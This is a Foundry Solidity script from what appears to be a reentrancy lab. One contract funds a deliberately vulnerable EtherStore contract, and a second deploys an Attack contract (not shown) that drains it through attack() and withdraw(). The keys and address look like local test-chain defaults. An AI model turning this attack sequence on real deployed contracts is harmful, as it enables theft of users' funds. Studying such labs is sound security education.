// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {EtherStore} from "../src/EtherStore.sol";
import {Attack} from "../src/Attack.sol";

contract DeployScript is Script {
    function setUp() public {}

    function run() public {
        address vulnerable = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
        vm.startBroadcast(0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d);
        (bool ok,) = vulnerable.call{value: 10 ether}(abi.encodeWithSignature("deposit()"));
        require(ok);
        vm.stopBroadcast();
        vm.startBroadcast(0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a);
        (bool ok2,) = vulnerable.call{value: 10 ether}(abi.encodeWithSignature("deposit()"));
        require(ok2);
        vm.stopBroadcast();
    }
}

contract AttackScript is Script {
    function setUp() public {}

    function run() public {
        address vulnerable = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
        vm.startBroadcast(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);
        Attack attack = new Attack(vulnerable);
        attack.attack{value: 1 ether}();
        attack.withdraw();
        vm.stopBroadcast();
    }
}
